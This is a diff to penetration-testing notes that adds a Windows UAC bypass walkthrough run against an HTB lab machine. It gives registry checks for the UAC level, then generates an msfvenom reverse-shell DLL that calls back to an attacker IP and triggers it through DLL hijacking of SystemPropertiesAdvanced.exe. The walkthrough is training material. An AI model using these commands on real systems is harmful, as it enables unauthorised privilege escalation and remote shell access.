@@ -248,5 +248,80 @@ robocopy /B C:\Secret .\ imp.txt
 
 <figure><img src="../../.gitbook/assets/image (1900).png" alt=""><figcaption></figcaption></figure>
 
-## Abusing Print Operators Group&#x20;
+## Abusing UAC&#x20;
+
+### Confirming UAC is enabled&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Checking UAC Level&#x20;
+
+#### UAC Levels&#x20;
+
+* **0 — Never notify:** UAC prompts are disabled; lowest security.
+* **1 — Prompt for credentials on secure desktop:** Admin must enter credentials.
+* **2 — Prompt for consent on secure desktop:** Admin must approve.
+* **3 — Prompt for credentials:** Credentials required, but not on secure desktop.
+* **4 — Prompt for consent:** Admin simply approves.
+* **5 — Prompt for consent for non-Windows binaries:** Default; prompts when a non-Windows app requests elevation.
+
+{% code overflow="wrap" %}
+```
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### Check Windows Version
+
+{% hint style="danger" %}
+_From here on, we'll switch to an HTB vulnerable machine to demonstrate UAC bypass techniques._
+{% endhint %}
+
+UAC bypasses leverage flaws or unintended functionality in different Windows builds. Let's examine the build of Windows we're looking to elevate on.
+
+{% code overflow="wrap" %}
+```powershell
+[environment]::OSVersion.Version
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1901).png" alt=""><figcaption></figcaption></figure>
+
+### Escalating Privileges&#x20;
+
+{% code overflow="wrap" %}
+```bash
+ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1902).png" alt=""><figcaption></figcaption></figure>
+
+#### Testing Normal Connection&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1903).png" alt=""><figcaption></figcaption></figure>
+
+We can see normal user's rights.&#x20;
+
+{% code overflow="wrap" %}
+```cmd
+C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1904).png" alt=""><figcaption></figcaption></figure>
 
